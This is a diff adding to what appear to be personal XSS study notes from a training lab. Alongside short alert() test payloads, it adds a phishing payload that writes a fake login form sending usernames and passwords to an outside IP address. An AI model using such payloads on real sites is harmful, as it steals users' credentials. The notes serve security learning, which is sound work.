@@ -23,3 +23,16 @@ Furthermore, some of the jQuery library functions that write to DOM objects are:
 - svg onload=alert(1)> -> payloads with js language
 - img src onerror=alert(document.domain)> -> inner html (img or iframe)
 
+# Lab
+## Phishing
+Identify:
+```bash
+'><script>alert("THM")</script>'<
+```
+Payload
+```bash
+'><img src=x onerror="document.write('<h3>Please login to continue</h3><form action=http://10.10.16.7:5656><input type=\'text\' name=\'username\' placeholder=\'Username\'><input type=\'password\' name=\'password\' placeholder=\'Password\'><input type=\'submit\' name=\'submit\' value=\'Login\'></form>'); document.getElementById('urlform').remove();">
+```
+## Session Hijacking
+
+
